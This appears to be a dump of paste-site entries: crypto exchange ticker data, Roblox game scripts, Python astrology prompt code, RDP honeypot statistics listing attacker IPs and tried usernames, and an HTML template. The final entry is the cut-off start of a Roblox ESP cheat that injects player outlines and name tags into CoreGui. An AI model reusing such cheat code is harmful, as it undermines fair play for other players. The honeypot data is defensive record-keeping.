                ""btc"": 1.000806,
                ""eth"": 19.645107,
                ""usd"": 70909
            },
            ""converted_volume"": {
                ""btc"": 120.455,
                ""eth"": 2364,
                ""usd"": 8534477
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.025888,
            ""timestamp"": ""2024-04-01T02:10:28+00:00"",
            ""last_traded_at"": ""2024-04-01T02:10:28+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:12:00+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://www.binance.com/en/trade/BTC_EUR?ref=37754157"",
            ""token_info_url"": null,
            ""coin_id"": ""bitcoin""
        },
        {
            ""base"": ""BTC"",
            ""target"": ""USDT"",
            ""market"": {
                ""name"": ""BCEX"",
                ""identifier"": ""bcex"",
                ""has_trading_incentive"": false
            },
            ""last"": 70883.98,
            ""volume"": 148.619838,
            ""converted_last"": {
                ""btc"": 0.99974486,
                ""eth"": 19.630375,
                ""usd"": 70898
            },
            ""converted_volume"": {
                ""btc"": 148.582,
                ""eth"": 2917,
                ""usd"": 10536912
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.162431,
            ""timestamp"": ""2024-04-01T01:52:14+00:00"",
            ""last_traded_at"": ""2024-04-01T01:52:14+00:00"",
            ""last_fetch_at"": ""2024-04-01T01:52:14+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://www.bcex.kr/market/btcusdt"",
            ""token_info_url"": null,
            ""coin_id"": ""bitcoin"",
            ""target_coin_id"": ""tether""
        },
        {
            ""base"": ""BTC"",
            ""target"": ""USDC"",
            ""market"": {
                ""name"": ""Bitrue"",
                ""identifier"": ""bitrue"",
                ""has_trading_incentive"": false
            },
            ""last"": 70864.81,
            ""volume"": 851.24,
            ""converted_last"": {
                ""btc"": 1.000181,
                ""eth"": 19.632828,
                ""usd"": 70865
            },
            ""converted_volume"": {
                ""btc"": 851.394,
                ""eth"": 16712,
                ""usd"": 60323038
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.041601,
            ""timestamp"": ""2024-04-01T02:11:49+00:00"",
            ""last_traded_at"": ""2024-04-01T02:11:49+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:11:49+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://www.bitrue.com/trade/btc_usdc"",
            ""token_info_url"": null,
            ""coin_id"": ""bitcoin"",
            ""target_coin_id"": ""usd-coin""
        },
        {
            ""base"": ""ETH"",
            ""target"": ""BTC"",
            ""market"": {
                ""name"": ""Bitget"",
                ""identifier"": ""bitget"",
                ""has_trading_incentive"": false
            },
            ""last"": 0.050966,
            ""volume"": 227.3128,
            ""converted_last"": {
                ""btc"": 1.0,
                ""eth"": 19.629282,
                ""usd"": 70852
            },
            ""converted_volume"": {
                ""btc"": 11.6393,
                ""eth"": 228.471,
                ""usd"": 824669
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.041197,
            ""timestamp"": ""2024-04-01T02:11:08+00:00"",
            ""last_traded_at"": ""2024-04-01T02:11:08+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:11:08+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://www.bitget.com/spot/ETHBTC"",
            ""token_info_url"": null,
            ""coin_id"": ""ethereum"",
            ""target_coin_id"": ""bitcoin""
        },
        {
            ""base"": ""BTC"",
            ""target"": ""CAD"",
            ""market"": {
                ""name"": ""Kraken"",
                ""identifier"": ""kraken"",
                ""has_trading_incentive"": false
            },
            ""last"": 95863.8,
            ""volume"": 17.39084188,
            ""converted_last"": {
                ""btc"": 0.99990749,
                ""eth"": 19.627466,
                ""usd"": 70846
            },
            ""converted_volume"": {
                ""btc"": 17.389233,
                ""eth"": 341.338,
                ""usd"": 1232064
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.020966,
            ""timestamp"": ""2024-04-01T02:10:32+00:00"",
            ""last_traded_at"": ""2024-04-01T02:10:32+00:00"",
            ""last_fetch_at"": ""2024-04-01T02:12:02+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://pro.kraken.com/app/trade/BTC-CAD"",
            ""token_info_url"": null,
            ""coin_id"": ""bitcoin""
        },
        {
            ""base"": ""BTC"",
            ""target"": ""USDT"",
            ""market"": {
                ""name"": ""ProBit Global"",
                ""identifier"": ""probit"",
                ""has_trading_incentive"": false
            },
            ""last"": 70825.0,
            ""volume"": 1686.69766586,
            ""converted_last"": {
                ""btc"": 0.99939507,
                ""eth"": 19.618471,
                ""usd"": 70810
            },
            ""converted_volume"": {
                ""btc"": 1686,
                ""eth"": 33090,
                ""usd"": 119435203
            },
            ""trust_score"": ""green"",
            ""bid_ask_spread_percentage"": 0.016945,
            ""timestamp"": ""2024-04-01T01:59:44+00:00"",
            ""last_traded_at"": ""2024-04-01T01:59:44+00:00"",
            ""last_fetch_at"": ""2024-04-01T01:59:44+00:00"",
            ""is_anomaly"": false,
            ""is_stale"": false,
            ""trade_url"": ""https://www.probit.com/app/exchange/BTC-USDT"",
            ""token_info_url"": null,
            ""coin_id"": ""bitcoin"",
            ""target_coin_id"": ""tether""
        }
    ]
}"
RSj7S7Xk,Untitled,Lancere,Lua,Sunday 31st of March 2024 09:19:06 PM CDT,http://roblox.com/asset?id=9250643;http://roblox.com/asset?id=477910063;
UWSaByyg,DialogueScript (Ponchokings Style),Sungmingamerpro13,CSS,Sunday 31st of March 2024 09:03:26 PM CDT,"local player = game.Players.LocalPlayer
local CreateDialogueEvent = game.ReplicatedStorage.CreateDialogueEvent
local DialogueFrame = player.PlayerGui.DialogueGui.DialogueFrame

local function playSound(sound_id) -- Plays typing sound
    local sound = Instance.new(""Sound"",game.ReplicatedStorage)
    sound.SoundId = sound_id
    sound.Volume = .1
    sound.PlayOnRemove = true
    sound:Destroy()
end

local function textAnimate(content) -- Animates each letter
    for i=1,string.len(content) do
        DialogueFrame.TextLabel.Text = string.sub(content,1,i)
        playSound(""rbxassetid://915576050"")
        if string.sub(content,i,i) == ""!"" or string.sub(content,i,i) == ""."" or string.sub(content,i,i) == ""?"" then
            wait(1)
        elseif     string.sub(content,i,i) == "","" then
            wait(.5)
        else
            wait(.05)
        end
    end
end

CreateDialogueEvent.OnClientEvent:Connect(function(name, image_id, content) -- activates when called from the Server
    if not player:findFirstChild(""secretEnding"") then
        DialogueFrame.nameLabel.Text = name
        DialogueFrame.ImageLabel.Image = image_id
        DialogueFrame.TextLabel.Text = """"
        DialogueFrame.Visible = true
        textAnimate(content)
    end
end)"
QF1XwYC8,Untitled,ArjanP,Python,Sunday 31st of March 2024 08:54:18 PM CDT,"    def generate_prompt_step2(self, step1_summary):
        """"""
        Generate the prompt for step 2 based on the summary of step 1.

        Parameters:
            step1_summary (str): The summary generated in step 1.

        Returns:
            str: The generated prompt for step 2.
        """"""
        
        step2_analyzes = [f""{step1_summary}\n""]
        step2_analyzes.append([""Overview of the house cusp and its signs and rulers and debilities.""])
        for cusp in const.LIST_HOUSES:
            house, sign, ruler, aspects, score, mutual_reception, essentials = self.chart_service.houses()
            step2_analyzes.append(f""The {cusp} cusp is in {sign} is {essentials} and its ruler is {ruler} and dignities score:"")
            if aspects:
                step2_analyzes.append(f""The ruler makes aspects with {aspects}"")
            if mutual_reception:
                step2_analyzes.append(f""IHas mutual reception"")

            step2_analyzes.append(f""{score}"")

        step2_analyzes.append(""Now link the question to the significators which aligns with the question and summarize these significators for step 3."")
        
        return step2_analyzes"
53RTk5q7,Untitled,ArjanP,Python,Sunday 31st of March 2024 08:36:15 PM CDT,"    def generate_prompt_step2(self, step1_summary):
        """"""
        Generate prompt step 2.

        Parameters:
        - self: the instance of the class
        - step2_summary: a summary for step 2

        Returns:
        - step3_summary: a combined summary of step 1, step 2, and planetary analysis result
        """"""
        
        step2_analyzes = [f""{step1_summary}\n""]
        step2_analyzes.append([""Link the question to one of the astrological houses and the signs on the house cusp. ""])
        for cusp in const.LIST_HOUSES:
            house, sign, ruler, score = self.chart_service.houses()
            step2_analyzes.append(f""The {cusp} cusp is in {sign} and its ruler is {ruler} and dignities score: {score}"")
        step2_analyzes.append(""Summarize these significators and continue with next step."")
        
        return step3_summary
"
D1VgW4jQ,2024-03-31_stats.json,rdp_snitch,JSON,Sunday 31st of March 2024 07:18:16 PM CDT,"{
  ""ip"": {
    ""128.199.242.196"": 4008,
    ""81.19.135.47"": 9,
    ""194.165.16.72"": 6,
    ""36.137.3.251"": 3,
    ""81.19.135.154"": 3,
    ""80.66.88.204"": 3,
    ""58.218.204.183"": 9,
    ""45.227.254.119"": 6,
    ""92.205.232.248"": 6,
    ""144.16.111.79"": 3,
    ""205.210.31.103"": 9,
    ""62.204.41.222"": 18,
    ""198.135.49.131"": 42,
    ""185.170.144.3"": 6,
    ""196.190.117.7"": 6,
    ""87.251.75.120"": 6,
    ""165.154.164.112"": 3,
    ""212.70.149.146"": 6,
    ""14.225.218.157"": 60,
    ""198.235.24.53"": 9,
    ""45.227.254.54"": 6,
    ""103.57.220.167"": 3,
    ""194.165.16.10"": 6,
    ""87.251.75.145"": 3,
    ""141.98.11.191"": 3,
    ""94.232.46.132"": 3,
    ""45.227.254.9"": 12,
    ""205.210.31.173"": 9,
    ""103.232.53.123"": 3,
    ""112.4.139.162"": 3,
    ""2.57.149.92"": 3,
    ""194.165.16.78"": 6,
    ""198.235.24.232"": 9,
    ""185.122.204.179"": 3,
    ""45.227.254.55"": 6
  },
  ""asn"": {
    ""AS14061"": 4008,
    ""AS209588"": 12,
    ""AS48721"": 18,
    ""AS9808"": 3,
    ""AS208091"": 12,
    ""AS4134"": 9,
    ""AS267784"": 30,
    ""AS21499"": 6,
    ""AS2697"": 3,
    ""AS396982"": 36,
    ""AS59425"": 18,
    ""AS396073"": 42,
    ""AS197414"": 6,
    ""AS24757"": 6,
    ""AS135377"": 3,
    ""AS204428"": 6,
    ""AS135905"": 63,
    ""AS209605"": 3,
    ""AS212482"": 3,
    ""AS63737"": 3,
    ""AS56046"": 3,
    ""AS208312"": 3,
    ""AS57523"": 3
  },
  ""isp"": {
    ""DigitalOcean, LLC"": 4008,
    ""Flyservers S.A."": 60,
    ""China Mobile"": 3,
    ""Xhost Internet Solutions"": 3,
    ""Chinanet"": 9,
    ""Host Europe GmbH"": 6,
    ""ERNET India"": 3,
    ""Google LLC"": 36,
    ""Horizon LLC"": 18,
    ""Majestic Hosting Solutions, LLC"": 42,
    ""Xhost Internet Solutions LP"": 18,
    ""Ethiotelecom"": 6,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3,
    ""SS-Net"": 6,
    ""Vietnam Posts and Telecommunications Group"": 60,
    ""INET"": 3,
    ""UAB Host Baltic"": 3,
    ""VIETSERVER"": 3,
    ""China Mobile Communications Corporation"": 3,
    ""Red Byte LLC"": 3,
    ""Chang Way Technologies Co. Limited"": 3
  },
  ""org"": {
    ""DigitalOcean, LLC"": 4008,
    ""Alviva Holding Limited"": 12,
    ""Flyservers S.A"": 18,
    ""China Mobile Communications Corporation"": 6,
    ""XHOSTIS"": 3,
    ""Chinanet JS"": 9,
    ""UAB Host Baltic"": 30,
    ""Unknown"": 15,
    ""ERNET India"": 3,
    ""Palo Alto Networks, Inc"": 36,
    ""Horizon LLC"": 18,
    ""Majestic Hosting Solutions, LLC"": 42,
    ""Xhostis"": 6,
    ""Xhost Internet Solutions"": 9,
    ""Ucloud Information Technology (hk) Limited"": 3,
    ""4Media Ltd"": 6,
    ""VNPT"": 60,
    ""iNET Media Company Limited"": 3,
    ""Dmitriy Panchenko"": 3,
    ""VietServer Services technology company limited"": 3,
    ""Chang Way Technologies Co. Limited"": 3,
    ""Starcrecium Limited"": 3
  },
  ""regionName"": {
    ""South West"": 4008,
    ""Hesse"": 15,
    ""Kaunas"": 18,
    ""Guangdong"": 3,
    ""Drenthe"": 3,
    ""Jiangsu"": 12,
    ""Vilnius"": 33,
    ""Grand Est"": 6,
    ""National Capital Territory of Delhi"": 3,
    ""California"": 36,
    ""Moscow"": 21,
    ""Texas"": 42,
    ""North Holland"": 15,
    ""Addis Ababa"": 6,
    ""Sliven"": 6,
    ""Hanoi"": 66,
    ""Perm Krai"": 3,
    ""Lesser Poland"": 3
  },
  ""country"": {
    ""Singapore"": 4008,
    ""Germany"": 15,
    ""Lithuania"": 51,
    ""China"": 15,
    ""The Netherlands"": 18,
    ""France"": 6,
    ""India"": 3,
    ""United States"": 78,
    ""Russia"": 24,
    ""Ethiopia"": 6,
    ""Bulgaria"": 6,
    ""Vietnam"": 66,
    ""Poland"": 3
  },
  ""account"": {
    ""hello"": 4128,
    ""Domain"": 24,
    ""Test"": 60,
    ""Administr"": 39,
    ""(empty)"": 9,
    ""pzxeAMMJF"": 3,
    ""iIiJSb"": 3,
    ""ALOAWe"": 3,
    ""Administrator"": 3,
    ""OwuxQIjFu"": 3,
    ""thTjuS"": 3,
    ""mbnzHI"": 3,
    ""gOwYlYNXH"": 3,
    ""PEnQMe"": 3,
    ""dAyinr"": 3,
    ""vJfyfncWf"": 3,
    ""hhzwbE"": 3,
    ""QoXegV"": 3
  },
  ""keyboard"": {
    ""Unknown"": 4299
  },
  ""client_build"": {
    ""Unknown"": 4299
  },
  ""client_name"": {
    ""Unknown"": 4299
  },
  ""ip_type"": {
    ""hosting & proxy"": 4008,
    ""Unknown"": 195,
    ""mobile"": 9,
    ""hosting"": 81,
    ""proxy"": 6
  }
}"
TU7HbCGy,2024-03-31_stats.json,rdp_snitch,JSON,Sunday 31st of March 2024 07:16:05 PM CDT,"{
  ""ip"": {
    ""128.199.242.196"": 2672,
    ""81.19.135.47"": 6,
    ""194.165.16.72"": 4,
    ""36.137.3.251"": 2,
    ""81.19.135.154"": 2,
    ""80.66.88.204"": 2,
    ""58.218.204.183"": 6,
    ""45.227.254.119"": 4,
    ""92.205.232.248"": 4,
    ""144.16.111.79"": 2,
    ""205.210.31.103"": 6,
    ""62.204.41.222"": 12,
    ""198.135.49.131"": 28,
    ""185.170.144.3"": 4,
    ""196.190.117.7"": 4,
    ""87.251.75.120"": 4,
    ""165.154.164.112"": 2,
    ""212.70.149.146"": 4,
    ""14.225.218.157"": 40,
    ""198.235.24.53"": 6,
    ""45.227.254.54"": 4,
    ""103.57.220.167"": 2,
    ""194.165.16.10"": 4,
    ""87.251.75.145"": 2,
    ""141.98.11.191"": 2,
    ""94.232.46.132"": 2,
    ""45.227.254.9"": 8,
    ""205.210.31.173"": 6,
    ""103.232.53.123"": 2,
    ""112.4.139.162"": 2,
    ""2.57.149.92"": 2,
    ""194.165.16.78"": 4,
    ""198.235.24.232"": 6,
    ""185.122.204.179"": 2,
    ""45.227.254.55"": 4
  },
  ""asn"": {
    ""AS14061"": 2672,
    ""AS209588"": 8,
    ""AS48721"": 12,
    ""AS9808"": 2,
    ""AS208091"": 8,
    ""AS4134"": 6,
    ""AS267784"": 20,
    ""AS21499"": 4,
    ""AS2697"": 2,
    ""AS396982"": 24,
    ""AS59425"": 12,
    ""AS396073"": 28,
    ""AS197414"": 4,
    ""AS24757"": 4,
    ""AS135377"": 2,
    ""AS204428"": 4,
    ""AS135905"": 42,
    ""AS209605"": 2,
    ""AS212482"": 2,
    ""AS63737"": 2,
    ""AS56046"": 2,
    ""AS208312"": 2,
    ""AS57523"": 2
  },
  ""isp"": {
    ""DigitalOcean, LLC"": 2672,
    ""Flyservers S.A."": 40,
    ""China Mobile"": 2,
    ""Xhost Internet Solutions"": 2,
    ""Chinanet"": 6,
    ""Host Europe GmbH"": 4,
    ""ERNET India"": 2,
    ""Google LLC"": 24,
    ""Horizon LLC"": 12,
    ""Majestic Hosting Solutions, LLC"": 28,
    ""Xhost Internet Solutions LP"": 12,
    ""Ethiotelecom"": 4,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 2,
    ""SS-Net"": 4,
    ""Vietnam Posts and Telecommunications Group"": 40,
    ""INET"": 2,
    ""UAB Host Baltic"": 2,
    ""VIETSERVER"": 2,
    ""China Mobile Communications Corporation"": 2,
    ""Red Byte LLC"": 2,
    ""Chang Way Technologies Co. Limited"": 2
  },
  ""org"": {
    ""DigitalOcean, LLC"": 2672,
    ""Alviva Holding Limited"": 8,
    ""Flyservers S.A"": 12,
    ""China Mobile Communications Corporation"": 4,
    ""XHOSTIS"": 2,
    ""Chinanet JS"": 6,
    ""UAB Host Baltic"": 20,
    ""Unknown"": 10,
    ""ERNET India"": 2,
    ""Palo Alto Networks, Inc"": 24,
    ""Horizon LLC"": 12,
    ""Majestic Hosting Solutions, LLC"": 28,
    ""Xhostis"": 4,
    ""Xhost Internet Solutions"": 6,
    ""Ucloud Information Technology (hk) Limited"": 2,
    ""4Media Ltd"": 4,
    ""VNPT"": 40,
    ""iNET Media Company Limited"": 2,
    ""Dmitriy Panchenko"": 2,
    ""VietServer Services technology company limited"": 2,
    ""Chang Way Technologies Co. Limited"": 2,
    ""Starcrecium Limited"": 2
  },
  ""regionName"": {
    ""South West"": 2672,
    ""Hesse"": 10,
    ""Kaunas"": 12,
    ""Guangdong"": 2,
    ""Drenthe"": 2,
    ""Jiangsu"": 8,
    ""Vilnius"": 22,
    ""Grand Est"": 4,
    ""National Capital Territory of Delhi"": 2,
    ""California"": 24,
    ""Moscow"": 14,
    ""Texas"": 28,
    ""North Holland"": 10,
    ""Addis Ababa"": 4,
    ""Sliven"": 4,
    ""Hanoi"": 44,
    ""Perm Krai"": 2,
    ""Lesser Poland"": 2
  },
  ""country"": {
    ""Singapore"": 2672,
    ""Germany"": 10,
    ""Lithuania"": 34,
    ""China"": 10,
    ""The Netherlands"": 12,
    ""France"": 4,
    ""India"": 2,
    ""United States"": 52,
    ""Russia"": 16,
    ""Ethiopia"": 4,
    ""Bulgaria"": 4,
    ""Vietnam"": 44,
    ""Poland"": 2
  },
  ""account"": {
    ""hello"": 2752,
    ""Domain"": 16,
    ""Test"": 40,
    ""Administr"": 26,
    ""(empty)"": 6,
    ""pzxeAMMJF"": 2,
    ""iIiJSb"": 2,
    ""ALOAWe"": 2,
    ""Administrator"": 2,
    ""OwuxQIjFu"": 2,
    ""thTjuS"": 2,
    ""mbnzHI"": 2,
    ""gOwYlYNXH"": 2,
    ""PEnQMe"": 2,
    ""dAyinr"": 2,
    ""vJfyfncWf"": 2,
    ""hhzwbE"": 2,
    ""QoXegV"": 2
  },
  ""keyboard"": {
    ""Unknown"": 2866
  },
  ""client_build"": {
    ""Unknown"": 2866
  },
  ""client_name"": {
    ""Unknown"": 2866
  },
  ""ip_type"": {
    ""hosting & proxy"": 2672,
    ""Unknown"": 130,
    ""mobile"": 6,
    ""hosting"": 54,
    ""proxy"": 4
  }
}"
JuNsqgPM,2024-03-31_stats.json,rdp_snitch,JSON,Sunday 31st of March 2024 07:15:09 PM CDT,"{
  ""ip"": {
    ""128.199.242.196"": 1336,
    ""81.19.135.47"": 3,
    ""194.165.16.72"": 2,
    ""36.137.3.251"": 1,
    ""81.19.135.154"": 1,
    ""80.66.88.204"": 1,
    ""58.218.204.183"": 3,
    ""45.227.254.119"": 2,
    ""92.205.232.248"": 2,
    ""144.16.111.79"": 1,
    ""205.210.31.103"": 3,
    ""62.204.41.222"": 6,
    ""198.135.49.131"": 14,
    ""185.170.144.3"": 2,
    ""196.190.117.7"": 2,
    ""87.251.75.120"": 2,
    ""165.154.164.112"": 1,
    ""212.70.149.146"": 2,
    ""14.225.218.157"": 20,
    ""198.235.24.53"": 3,
    ""45.227.254.54"": 2,
    ""103.57.220.167"": 1,
    ""194.165.16.10"": 2,
    ""87.251.75.145"": 1,
    ""141.98.11.191"": 1,
    ""94.232.46.132"": 1,
    ""45.227.254.9"": 4,
    ""205.210.31.173"": 3,
    ""103.232.53.123"": 1,
    ""112.4.139.162"": 1,
    ""2.57.149.92"": 1,
    ""194.165.16.78"": 2,
    ""198.235.24.232"": 3,
    ""185.122.204.179"": 1,
    ""45.227.254.55"": 2
  },
  ""asn"": {
    ""AS14061"": 1336,
    ""AS209588"": 4,
    ""AS48721"": 6,
    ""AS9808"": 1,
    ""AS208091"": 4,
    ""AS4134"": 3,
    ""AS267784"": 10,
    ""AS21499"": 2,
    ""AS2697"": 1,
    ""AS396982"": 12,
    ""AS59425"": 6,
    ""AS396073"": 14,
    ""AS197414"": 2,
    ""AS24757"": 2,
    ""AS135377"": 1,
    ""AS204428"": 2,
    ""AS135905"": 21,
    ""AS209605"": 1,
    ""AS212482"": 1,
    ""AS63737"": 1,
    ""AS56046"": 1,
    ""AS208312"": 1,
    ""AS57523"": 1
  },
  ""isp"": {
    ""DigitalOcean, LLC"": 1336,
    ""Flyservers S.A."": 20,
    ""China Mobile"": 1,
    ""Xhost Internet Solutions"": 1,
    ""Chinanet"": 3,
    ""Host Europe GmbH"": 2,
    ""ERNET India"": 1,
    ""Google LLC"": 12,
    ""Horizon LLC"": 6,
    ""Majestic Hosting Solutions, LLC"": 14,
    ""Xhost Internet Solutions LP"": 6,
    ""Ethiotelecom"": 2,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 1,
    ""SS-Net"": 2,
    ""Vietnam Posts and Telecommunications Group"": 20,
    ""INET"": 1,
    ""UAB Host Baltic"": 1,
    ""VIETSERVER"": 1,
    ""China Mobile Communications Corporation"": 1,
    ""Red Byte LLC"": 1,
    ""Chang Way Technologies Co. Limited"": 1
  },
  ""org"": {
    ""DigitalOcean, LLC"": 1336,
    ""Alviva Holding Limited"": 4,
    ""Flyservers S.A"": 6,
    ""China Mobile Communications Corporation"": 2,
    ""XHOSTIS"": 1,
    ""Chinanet JS"": 3,
    ""UAB Host Baltic"": 10,
    ""Unknown"": 5,
    ""ERNET India"": 1,
    ""Palo Alto Networks, Inc"": 12,
    ""Horizon LLC"": 6,
    ""Majestic Hosting Solutions, LLC"": 14,
    ""Xhostis"": 2,
    ""Xhost Internet Solutions"": 3,
    ""Ucloud Information Technology (hk) Limited"": 1,
    ""4Media Ltd"": 2,
    ""VNPT"": 20,
    ""iNET Media Company Limited"": 1,
    ""Dmitriy Panchenko"": 1,
    ""VietServer Services technology company limited"": 1,
    ""Chang Way Technologies Co. Limited"": 1,
    ""Starcrecium Limited"": 1
  },
  ""regionName"": {
    ""South West"": 1336,
    ""Hesse"": 5,
    ""Kaunas"": 6,
    ""Guangdong"": 1,
    ""Drenthe"": 1,
    ""Jiangsu"": 4,
    ""Vilnius"": 11,
    ""Grand Est"": 2,
    ""National Capital Territory of Delhi"": 1,
    ""California"": 12,
    ""Moscow"": 7,
    ""Texas"": 14,
    ""North Holland"": 5,
    ""Addis Ababa"": 2,
    ""Sliven"": 2,
    ""Hanoi"": 22,
    ""Perm Krai"": 1,
    ""Lesser Poland"": 1
  },
  ""country"": {
    ""Singapore"": 1336,
    ""Germany"": 5,
    ""Lithuania"": 17,
    ""China"": 5,
    ""The Netherlands"": 6,
    ""France"": 2,
    ""India"": 1,
    ""United States"": 26,
    ""Russia"": 8,
    ""Ethiopia"": 2,
    ""Bulgaria"": 2,
    ""Vietnam"": 22,
    ""Poland"": 1
  },
  ""account"": {
    ""hello"": 1376,
    ""Domain"": 8,
    ""Test"": 20,
    ""Administr"": 13,
    ""(empty)"": 3,
    ""pzxeAMMJF"": 1,
    ""iIiJSb"": 1,
    ""ALOAWe"": 1,
    ""Administrator"": 1,
    ""OwuxQIjFu"": 1,
    ""thTjuS"": 1,
    ""mbnzHI"": 1,
    ""gOwYlYNXH"": 1,
    ""PEnQMe"": 1,
    ""dAyinr"": 1,
    ""vJfyfncWf"": 1,
    ""hhzwbE"": 1,
    ""QoXegV"": 1
  },
  ""keyboard"": {
    ""Unknown"": 1433
  },
  ""client_build"": {
    ""Unknown"": 1433
  },
  ""client_name"": {
    ""Unknown"": 1433
  },
  ""ip_type"": {
    ""hosting & proxy"": 1336,
    ""Unknown"": 65,
    ""mobile"": 3,
    ""hosting"": 27,
    ""proxy"": 2
  }
}"
umKzpymU,RandomizerMain,Grillkol,Lua,Sunday 31st of March 2024 06:29:00 PM CDT,"-- Server backend for random wheel commission
-- Author: grillkol (discord)
-- Copying or distributing this script is not permitted without explicit permission from the author.

local ReplicatedStorage = game:GetService(""ReplicatedStorage"")
local HttpService = game:GetService(""HttpService"")

local RandomizerMap = require(ReplicatedStorage.Modules.RandomizerMap)
local RNG = require(ReplicatedStorage.Modules.RNG)

local rewardCache = {}

local RandomizerHandler = {}

function RandomizerHandler.Initialize()
	ReplicatedStorage.Remotes.RandomizerNetworker.OnServerEvent:Connect(function(player, topic, data)
		if topic == ""requestSpin"" then
			RandomizerHandler.InitiateSpin(player, ""shogun"")
		elseif topic == ""completedSpin"" then
			RandomizerHandler.CompletedSpin(player, data)
		end
	end)
end

function RandomizerHandler.CompletedSpin(player, data)
	if data.id then
		local rewardData = rewardCache[data.id]
		
		if rewardData then
			rewardCache[data.id] = nil
			print(rewardData)
			-- Here you can run any needed functions such as giving player the item
		end
	end
end

function RandomizerHandler.TimeoutReward(data)
	task.delay(60, function()
		rewardCache[data.id] = nil
	end)
end

function RandomizerHandler.InitiateSpin(player, randomizerType) -- randomizerType = ""shogun""
	local data = {}
	
	data.randomizerType = randomizerType
	data.item, data.rarity = RandomizerMap[data.randomizerType]()
	data.id = HttpService:GenerateGUID()
	rewardCache[data.id] = data
	ReplicatedStorage.Remotes.RandomizerNetworker:FireClient(player, ""startSpin"", data)
end

return RandomizerHandler"
Ts6kd18n,Blossom No.1 | ห้องส่วนรวม,Kelly-B9978,HTML,Sunday 31st of March 2024 05:45:39 PM CDT,"<!--คู่มือการใช้งาน
สีพื้นหลัง : --bls-bg: #594e36;
สีตัวอักษร : --bls-txtcolor: #fbf5f3;
สีขอบ : --bls-bdcolor: #fbf5f3;
สีรอง : --bls-subtxtcolor: #b29459;
รูปโลโก้บ้าน : --bls-logo: transparent; ถ้าต้องการใส่รูปให้แก้ไขเป็น --bls-logo: url(--ลิงก์รูปภาพ);
ฟอนต์ภาษาไทย : --bls-fontth: 'Bai Jamjuree';
ฟอนต์ภาษาอังกฤษ : --bls-fonten: 'Dosis';
*ฟังก์ชัน Slideshow : --bls-animation: bls-slideshow3;
**รูปห้อง : --bls-room: transparent;

*ฟังก์ชัน Slideshow จะโชว์รูปห้องในมุมต่าง ๆ ในค่าเริ่มต้นจะเป็นลูป 3 รูป
- ถ้ามี 4 รูป 
   - ให้ใส่เป็น --bls-animation: bls-slideshow4; 
   - เพิ่ม <div class=""blsimg""><img src=""--รูปที่ 4--""></div> ต่อจากรูปที่ 3
- ถ้ามี 3 รูป ไม่ต้องแก้ไขอะไร
- ถ้ามี 2 รูป 
   - ให้ใส่เป็น --bls-animation: bls-slideshow2; 
   - ลบ <div class=""blsimg""><img src=""--รูปที่ 3--""></div> ออก
- ถ้ามี 1 รูป 
   - ให้ลบ --bls-animation: bls-slideshow3; ทิ้ง 
   - ลบ <div class=""blspic-wrap"">
        <div class=""blsimg""><img src=""--รูปที่ 1--""></div>
        <div class=""blsimg""><img src=""--รูปที่ 2--""></div>
        <div class=""blsimg""><img src=""--รูปที่ 3--""></div>
        <div class=""blsimg""><img src=""--รูปที่ 1--""></div></div>
     ออกให้หมด

**รูปห้อง สำหรับโชว์รูปเดียว ให้แก้ไข --bls-room: transparent; เป็น --bls-room: url(--ลิงก์รูปภาพ);
-->

<link href=""https://dl.dropbox.com/scl/fi/svf7clfpa65q3bmllqe37/blossom1.css?rlkey=cuao5yoy70b4jo8tu2feu34hx"" rel=""stylesheet"">
<div id=""zzzcode""><a href=""https://discord.com/users/625292873914515456/"" target=""_blank""></a><div class=""blscontainer"" style=""--bls-bg: #594e36;--bls-txtcolor: #fbf5f3;--bls-bdcolor: #fbf5f3;--bls-subtxtcolor: #b29459;--bls-logo: transparent;--bls-fontth: 'Bai Jamjuree';--bls-fonten: 'Dosis';--bls-animation: bls-slideshow3;--bls-room: transparent;"">
<div class=""blsleft""><div class=""blsheader-res""><div class=""blsfloor"">01</div><div class=""blshouse""></div></div>
<div class=""blspic""><div class=""blspic-wrap"">
<div class=""blsimg""><img src=""--รูปที่ 1--""></div>
<div class=""blsimg""><img src=""--รูปที่ 2--""></div>
<div class=""blsimg""><img src=""--รูปที่ 3--""></div>
<div class=""blsimg""><img src=""--รูปที่ 1--""></div></div></div></div>
<div class=""blsright"">
<div class=""blsheader""><div class=""blsfloor"">01</div><div class=""blshouse""></div></div>
<div class=""blsdesc"">
<div class=""blsroom""><div class=""blsroomflex""><div class=""blsroomname"">--ชื่อห้อง--</div><div class=""blslogo""></div></div>
<details><summary>Plan Details</summary><div class=""blsplan""><img src=""--รูปแปลนห้อง--""></div></details></div>
--คำบรรยาย--
</div></div></div></div>"
57QN70gH,jamkles esp,jamkles,Lua,Sunday 31st of March 2024 05:29:32 PM CDT,"local Outlines = true
local OutlineColoring = Color3.fromRGB(255, 255, 255)
local OutlineFill = false
local FillOpacity = 1
local FillColoring = Color3.fromRGB(255, 255, 255)

local NameTags = true
local TextFont = Enum.Font.RobotoMono
local NameColor = Color3.fromRGB(255, 255, 255)
local NamePositioning = false

--[[
   By jamkes
--]]

--// Don't Touch!
local Folder = Instance.new(""Folder"", game:GetService(""CoreGui""))
Folder.Name = """"

AddOutline = function(Character)
   local Highlight = Instance.new(""Highlight"", Folder)
   
   Highlight.OutlineColor = OutlineColoring
   Highlight.Adornee = Character
   
   if OutlineFill == true then
       Highlight.FillColor = FillColoring
       Highlight.FillTransparency = FillOpacity
   else
       Highlight.FillTransparency = 1
   end
end

AddNameTag = function(Character)
   local BGui = Instance.new(""BillboardGui"", Folder)
   local Frame = Instance.new(""Frame"", BGui)
